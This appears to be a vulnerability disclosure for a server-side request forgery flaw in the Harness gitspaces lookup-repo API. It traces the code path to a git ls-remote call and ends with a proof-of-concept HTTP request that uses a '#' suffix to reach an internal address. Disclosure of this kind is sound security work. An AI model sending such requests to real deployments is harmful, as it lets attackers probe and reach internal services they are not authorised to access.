# Vendor

harness

# Product

harness

# version

v2025.1000.4050

# Download 

https://github.com/harness/harness

# Vulnerability

SSRF

# Description

The root cause is that the back-end code receives a user-controllable URL parameter and, without performing strict security validation, directly uses this URL to initiate a network request on behalf of the server itself.

# Analysis

Endpoint: `POST /api/v1/gitspaces/lookup-repo`

Vulnerable Parameter: The `url` field in the JSON request body.

Code Path:

  The `LookupRepo` function in `app/api/controller/gitspace/lookup_repo.go` receives the user-provided `url`.

  It calls `sanitizeLookupRepoInput` which performs basic URL parsing and scheme validation (ensuring `http` or `https` is present). However, this sanitization is insufficient to prevent SSRF or command injection.

  The `url` is then passed to `c.scm.CheckValidCodeRepo` in `app/gitspace/scm/scm.go`.

  `CheckValidCodeRepo` calls `s.detectBranch`, which in turn calls `detectDefaultGitBranch`.

  The `detectDefaultGitBranch` function constructs and executes a `git ls-remote` command, passing the user-controlled `repoURL` (which is the `url` from the request) directly as an argument:

    ```go
    cmd := command.New("ls-remote",
        command.WithFlag("--symref"),
        command.WithFlag("-q"),
        command.WithArg(gitRepoDir), // gitRepoDir is the user-provided URL
        command.WithArg("HEAD"),
    )
    if err := cmd.Run(ctx, command.WithStdout(output)); err != nil {
        // ...
    }
    ```


Vulnerability Verification:

We need to add '#' after the internal address we want to request to avoid its own parameters affecting our request

<img width="979" height="376" alt="image" src="https://github.com/user-attachments/assets/a369a8a0-c989-4104-8710-8a23397639db" />


# POC
```
POST /api/v1/gitspaces/lookup-repo HTTP/1.1
Host: 192.168.43.165:3000
Cookie: token=XXX
Connection: close
Content-Length: 68

{"space_ref":"a","url":"http://192.168.43.165:9877/123.php?id=111#"}

```





